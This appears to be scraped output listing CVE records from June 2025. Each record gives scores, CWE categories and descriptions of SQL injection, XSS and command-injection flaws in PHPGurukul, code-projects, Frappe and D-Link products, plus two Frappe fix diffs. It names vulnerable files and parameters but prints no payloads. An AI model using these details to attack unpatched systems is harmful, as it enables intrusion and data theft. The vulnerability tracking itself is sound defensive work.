Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314409 ---
Form_Login

Form_Login

authCode/goURL

================================================================================


CVE ID: CVE-2025-6915
Published: 2025-06-30T17:15:34.407
Modified: 2025-07-08T14:52:37.427
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in PHPGurukul Student Record System 3.2. Affected by this issue is some unknown functionality of the file /register.php. The manipulation of the argument session leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/f1rstb100d/myCVE/issues/98 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314408 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314408 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605080 [Third Party Advisory, VDB Entry]
  6. https://github.com/f1rstb100d/myCVE/issues/98 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314408 ---
session

================================================================================


CVE ID: CVE-2025-52896
Published: 2025-06-30T17:15:33.093
Modified: 2025-07-08T14:10:33.893
CVSS Score: 5.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
Frappe is a full-stack web application framework. Prior to versions 14.94.2 and 15.57.0, authenticated users could upload carefully crafted malicious files via Data Import, leading to cross-site scripting (XSS). This issue has been patched in versions 14.94.2 and 15.57.0. There are no workarounds for this issue other than upgrading.

References (4):
  1. https://github.com/frappe/frappe/commit/152fd09de5bca16b8d299d715a1f5df6fca3866f [Patch]
  2. https://github.com/frappe/frappe/commit/f11c53d4df745b58bd1c1c08e1634a2f5a55322a [Patch]
  3. https://github.com/frappe/frappe/pull/31483 [Issue Tracking]
  4. https://github.com/frappe/frappe/security/advisories/GHSA-hv29-66qg-2v6p [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/frappe/frappe/commit/152fd09de5bca16b8d299d715a1f5df6fca3866f ---
From 152fd09de5bca16b8d299d715a1f5df6fca3866f Mon Sep 17 00:00:00 2001
From: "mergify[bot]" <37929162+mergify[bot]@users.noreply.github.com>
Date: Tue, 4 Mar 2025 05:29:43 +0000
Subject: [PATCH] fix(data_import): sanitize preview data and filename
 (backport #31483) (#31497)

* fix(import_preview): sanitize preview data

Signed-off-by: Akhil Narang <me@akhilnarang.dev>
(cherry picked from commit 2a5b9e45d137657490f86989ebdc2551a71cc2fc)

* fix(attach): sanitise filename before display

Signed-off-by: Akhil Narang <me@akhilnarang.dev>
(cherry picked from commit 3f483790dca75cdf81f9831847097af78440f224)

---------

Co-authored-by: Akhil Narang <me@akhilnarang.dev>
---
 frappe/public/js/frappe/data_import/import_preview.js | 4 ++++
 frappe/public/js/frappe/form/controls/attach.js       | 6 ++++--
 2 files changed, 8 insertions(+), 2 deletions(-)

diff --git a/frappe/public/js/frappe/data_import/import_preview.js b/frappe/public/js/frappe/data_import/import_preview.js
index 58b0cdb5c29a..9d9a24d4a95b 100644
--- a/frappe/public/js/frappe/data_import/import_preview.js
+++ b/frappe/public/js/frappe/data_import/import_preview.js
@@ -120,6 +120,10 @@ frappe.data_import.ImportPreview = class ImportPreview {
 				if (cell == null) {
 					return "";
 				}
+
+				if (typeof cell === "string") {
+					cell = frappe.utils.xss_sanitise(cell);
+				}
 				return cell;
 			});
 		});
diff --git a/frappe/public/js/frappe/form/controls/attach.js b/frappe/public/js/frappe/form/controls/attach.js
index 6bff5387ec12..6d0189931e96 100644
--- a/frappe/public/js/frappe/form/controls/attach.js
+++ b/frappe/public/js/frappe/form/controls/attach.js
@@ -107,13 +107,15 @@ frappe.ui.form.ControlAttach = class ControlAttach extends frappe.ui.form.Contro
 				this.$value
 					.toggle(true)
 					.find(".attached-file-link")
-					.html(filename || this.value)
+					.html(frappe.utils.xss_sanitise(filename || this.value))
 					.attr("href", dataurl || this.value);
 			} else {
 				this.$wrapper.html(`
 					  <div class="attached-file flex justify-between align-center">
 						<div class="ellipsis">
-						  <a href="${dataurl || this.value}" target="_blank">${filename || this.value}</a>
+						  <a href="${dataurl || this.value}" target="_blank">${frappe.utils.xss_sanitise(
+					filename || this.value
+				)}</a>
 						</div>
 					  </div>
 				`);


================================================================================


CVE ID: CVE-2025-52895
Published: 2025-06-30T17:15:32.930
Modified: 2025-07-08T14:10:54.147
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
Frappe is a full-stack web application framework. Prior to versions 14.94.3 and 15.58.0, SQL injection could be achieved via a specially crafted request, which could allow malicious person to gain access to sensitive information. This issue has been patched in versions 14.94.3 and 15.58.0. There are no workarounds for this issue other than upgrading.

References (4):
  1. https://github.com/frappe/frappe/commit/c795e351be033070174437324d74f44759a744a6 [Patch]
  2. https://github.com/frappe/frappe/commit/f0933590103c80c6393647dd0403d399e64c951c [Patch]
  3. https://github.com/frappe/frappe/pull/31526 [Issue Tracking]
  4. https://github.com/frappe/frappe/security/advisories/GHSA-mhj8-jfhf-mcw9 [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/frappe/frappe/commit/c795e351be033070174437324d74f44759a744a6 ---
From 819f910182eb0731adf90223d408c6d8a1228309 Mon Sep 17 00:00:00 2001
From: Akhil Narang <me@akhilnarang.dev>
Date: Wed, 5 Mar 2025 14:17:39 +0530
Subject: [PATCH] fix: check properly for blacklisted function usage

Signed-off-by: Akhil Narang <me@akhilnarang.dev>
(cherry picked from commit 3c01bf3d5caa4c762a74f1c9959a0691cb34b3e1)
---
 frappe/model/db_query.py | 5 +++--
 1 file changed, 3 insertions(+), 2 deletions(-)

diff --git a/frappe/model/db_query.py b/frappe/model/db_query.py
index 8ec31be37153..d72e4509db42 100644
--- a/frappe/model/db_query.py
+++ b/frappe/model/db_query.py
@@ -1124,8 +1124,9 @@ def validate_order_by_and_group_by(self, parameters: str):
 						tbl = tbl[4:-1]
 					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))
 
-			if function in blacklisted_sql_functions:
-				frappe.throw(_("Cannot use {0} in order/group by").format(field))
+			# Check if the function is used anywhere in the field
+			if any(func in function for func in blacklisted_sql_functions):
+				frappe.throw(_("Cannot use {0} in order/group by").format(function))
 
 	def add_limit(self):
 		if self.limit_page_length:


================================================================================


CVE ID: CVE-2025-26074
Published: 2025-06-30T17:15:31.987
Modified: 2025-06-30T19:15:22.920
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
Orkes Conductor v3.21.11 allows remote attackers to execute arbitrary OS commands through unrestricted access to Java classes.

References (3):
  1. https://github.com/conductor-oss/conductor
  2. https://github.com/conductor-oss/conductor/blob/main/core/src/main/java/com/netflix/conductor/core/events/ScriptEvaluator.java
  3. https://medium.com/@mrcnry/cve-2025-26074-remote-code-execution-in-conductor-oss-via-inline-javascript-injection-5ce3cb651cfb

Attempting to extract code examples from references...

--- Code from https://github.com/conductor-oss/conductor ---
git clone https://github.com/conductor-oss/conductor

<span class="pl-c1">cd</span> conductor

docker compose -f docker/docker-compose.yaml up

================================================================================


CVE ID: CVE-2025-6914
Published: 2025-06-30T16:15:30.010
Modified: 2025-07-08T14:13:59.330
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in PHPGurukul Student Record System 3.2. Affected by this vulnerability is an unknown functionality of the file /edit-student.php. The manipulation of the argument fmarks2 leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/f1rstb100d/myCVE/issues/97 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314407 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314407 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605079 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314407 ---
fmarks2

================================================================================


CVE ID: CVE-2025-6913
Published: 2025-06-30T16:15:29.817
Modified: 2025-07-08T14:14:13.950
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in PHPGurukul Student Record System 3.2. Affected is an unknown function of the file /admin-profile.php. The manipulation of the argument aemailid leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/f1rstb100d/myCVE/issues/96 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314406 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314406 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605078 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314406 ---
aemailid

================================================================================


CVE ID: CVE-2025-6912
Published: 2025-06-30T15:15:24.510
Modified: 2025-07-08T14:14:24.530
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in PHPGurukul Student Record System 3.2. It has been rated as critical. This issue affects some unknown processing of the file /manage-students.php. The manipulation of the argument del leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/f1rstb100d/myCVE/issues/95 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314405 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314405 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605077 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314405 ---
del

================================================================================


CVE ID: CVE-2025-6911
Published: 2025-06-30T15:15:24.310
Modified: 2025-07-08T14:15:05.867
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in PHPGurukul Student Record System 3.2. It has been declared as critical. This vulnerability affects unknown code of the file /manage-subjects.php. The manipulation of the argument del leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/f1rstb100d/myCVE/issues/94 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://phpgurukul.com/ [Permissions Required, Product, Third Party Advisory, VDB Entry]
  3. https://vuldb.com/?ctiid.314404 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?id.314404 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605076 [Third Party Advisory, VDB Entry]
  6. https://github.com/f1rstb100d/myCVE/issues/94 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314404 ---
del

================================================================================


CVE ID: CVE-2023-47310
Published: 2025-06-30T15:15:22.493
Modified: 2025-06-30T20:15:23.810
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N

CWE Categories:
  - CWE-1174: CWE-1174

Description:
A misconfiguration in the default settings of MikroTik RouterOS 7 and fixed in v7.14 allows incoming IPv6 UDP traceroute packets.

References (3):
  1. http://mikrotik.com
  2. http://routeros.com
  3. https://forum.mikrotik.com/t/fixed-in-7-14-security-vulnerability-default-configuration-firewall-bypass-for-ipv6-udp/262186

Attempting to extract code examples from references...

--- Code from https://forum.mikrotik.com/t/fixed-in-7-14-security-vulnerability-default-configuration-firewall-bypass-for-ipv6-udp/262186 ---
<code class="lang-auto">/ipv6 firewall filter
add action=accept chain=input comment="defconf: accept UDP traceroute" port=33434-33534 protocol=udp


dst-port=33434-33534

================================================================================


CVE ID: CVE-2025-6910
Published: 2025-06-30T14:15:25.343
Modified: 2025-07-08T14:15:16.237
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in PHPGurukul Student Record System 3.2. It has been classified as critical. This affects an unknown part of the file /session.php. The manipulation of the argument session leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/f1rstb100d/myCVE/issues/93 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314403 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314403 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605075 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314403 ---
session

================================================================================


CVE ID: CVE-2025-6909
Published: 2025-06-30T14:15:25.083
Modified: 2025-07-08T14:15:29.440
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in PHPGurukul Old Age Home Management System 1.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /admin/add-scdetails.php. The manipulation of the argument emeradd leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/f1rstb100d/myCVE/issues/92 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314401 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314401 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.604929 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314401 ---
emeradd

================================================================================


CVE ID: CVE-2025-6908
Published: 2025-06-30T13:15:32.133
Modified: 2025-07-08T14:15:57.870
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, was found in PHPGurukul Old Age Home Management System 1.0. Affected is an unknown function of the file /admin/edit-services.php. The manipulation of the argument sertitle leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/f1rstb100d/myCVE/issues/91 [Exploit, Third Party Advisory, Issue Tracking]
  2. https://phpgurukul.com/ [Product]
  3. https://vuldb.com/?ctiid.314400 [Permissions Required, Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?id.314400 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.604928 [Third Party Advisory, VDB Entry]
  6. https://github.com/f1rstb100d/myCVE/issues/91 [Exploit, Third Party Advisory, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314400 ---
sertitle

================================================================================


CVE ID: CVE-2025-6907
Published: 2025-06-30T13:15:31.700
Modified: 2025-07-01T16:11:15.027
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in code-projects Car Rental System 1.0. This vulnerability affects unknown code of the file /book_car.php. The manipulation of the argument fname leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/zzb1388/cve/issues/13 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314398 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314398 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.606158 [Third Party Advisory, VDB Entry]
  6. https://github.com/zzb1388/cve/issues/13 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314398 ---
fname

================================================================================


CVE ID: CVE-2025-6906
Published: 2025-06-30T13:15:31.340
Modified: 2025-07-01T16:15:18.367
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical has been found in code-projects Car Rental System 1.0. This affects an unknown part of the file /login.php. The manipulation of the argument uname leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/zzb1388/cve/issues/14 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314397 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314397 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.606157 [Third Party Advisory, VDB Entry]
  6. https://github.com/zzb1388/cve/issues/14 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314397 ---
uname

================================================================================


CVE ID: CVE-2025-6905
Published: 2025-06-30T12:15:22.990
Modified: 2025-07-11T17:00:00.373
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in code-projects Car Rental System 1.0. This issue affects some unknown processing of the file /signup.php. The manipulation of the argument fname leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/zzb1388/cve/issues/15 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314399 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314399 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.606156 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314399 ---
fname

================================================================================


CVE ID: CVE-2025-6904
Published: 2025-06-30T11:15:26.080
Modified: 2025-07-11T16:41:31.180
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Car Rental System 1.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file /admin/add_cars.php. The manipulation of the argument car_name leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/MaxedFF/cve/issues/2 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314396 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314396 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.604569 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314396 ---
car_name

================================================================================


CVE ID: CVE-2025-6903
Published: 2025-06-30T11:15:25.890
Modified: 2025-07-11T16:41:20.080
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Car Rental System 1.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file /admin/approve.php. The manipulation of the argument ID leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/MaxedFF/cve/issues/1 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314395 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314395 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.604568 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314395 ---
id

================================================================================


CVE ID: CVE-2025-6902
Published: 2025-06-30T10:15:26.463
Modified: 2025-07-08T14:16:12.293
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Inventory Management System 1.0. It has been classified as critical. Affected is an unknown function of the file /php_action/editUser.php. The manipulation of the argument edituserName leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/p1nkshox/cve/issues/1 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314394 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314394 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.604509 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314394 ---
edituserName

================================================================================


CVE ID: CVE-2025-6901
Published: 2025-06-30T10:15:26.213
Modified: 2025-07-08T14:16:24.390
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in code-projects Inventory Management System 1.0 and classified as critical. This issue affects some unknown processing of the file /php_action/removeUser.php. The manipulation of the argument userid leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/p1nkshox/cve/issues/2 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314393 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314393 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.604508 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314393 ---
userid

================================================================================


CVE ID: CVE-2025-6900
Published: 2025-06-30T09:15:27.380
Modified: 2025-07-01T16:21:48.767
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284
  - CWE-434: Unrestricted Upload of File with Dangerous Type
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
A vulnerability has been found in code-projects Library System 1.0 and classified as critical. This vulnerability affects unknown code of the file /add-book.php. The manipulation of the argument image leads to unrestricted upload. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/W2-l0mechan1c/CVE1/issues/1 [Exploit, Issue Tracking, Third Party Advisory, Mitigation]
  3. https://vuldb.com/?ctiid.314392 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314392 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.604504 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314392 ---
image

================================================================================


CVE ID: CVE-2025-6899
Published: 2025-06-30T09:15:27.160
Modified: 2025-07-14T17:19:26.013
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability, which was classified as critical, was found in D-Link DI-7300G+ and DI-8200G 17.12.20A1/19.12.25A1. This affects an unknown part of the file msp_info.htm. The manipulation of the argument flag/cmd/iface leads to os command injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/2664521593/mycve/blob/main/D-Link_DI/CJ_IN_DLink_4_en.pdf [Exploit, Issue Tracking]
  2. https://vuldb.com/?ctiid.314391 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314391 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604444 [Third Party Advisory, VDB Entry]
  5. https://www.dlink.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314391 ---
flag/cmd/iface

================================================================================


CVE ID: CVE-2025-6898
Published: 2025-06-30T08:15:24.113
Modified: 2025-07-14T17:19:15.030
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability, which was classified as critical, has been found in D-Link DI-7300G+ 19.12.25A1. Affected by this issue is some unknown functionality of the file in proxy_client.asp. The manipulation of the argument proxy_srv/proxy_lanport/proxy_lanip/proxy_srvport leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/2664521593/mycve/blob/main/D-Link_DI/CJ_IN_DLink_3_en.pdf [Issue Tracking, Third Party Advisory]
  2. https://vuldb.com/?ctiid.314390 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314390 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604443 [Third Party Advisory, VDB Entry]
  5. https://www.dlink.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314390 ---
proxy_srv/proxy_lanport/proxy_lanip/proxy_srvport

================================================================================


CVE ID: CVE-2025-6897
Published: 2025-06-30T08:15:23.843
Modified: 2025-07-01T16:30:28.957
CVSS Score: 5.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
  - CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Description:
A vulnerability classified as critical was found in D-Link DI-7300G+ 19.12.25A1. Affected by this vulnerability is an unknown functionality of the file httpd_debug.asp. The manipulation of the argument Time leads to os command injection. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/2664521593/mycve/blob/main/D-Link_DI/CJ_IN_DLink_2_en.pdf [Broken Link]
  2. https://vuldb.com/?ctiid.314389 [VDB Entry, Permissions Required]
  3. https://vuldb.com/?id.314389 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.604442 [Third Party Advisory, VDB Entry]
  5. https://www.dlink.com/ [Product]
  6. https://github.com/2664521593/mycve/blob/main/D-Link_DI/CJ_IN_DLink_2_en.pdf [Broken Link]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314389 ---
time

================================================================================


CVE ID: CVE-2025-6896
Published: 2025-06-30T07:15:23.543
Modified: 2025-07-14T17:19:06.300
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')
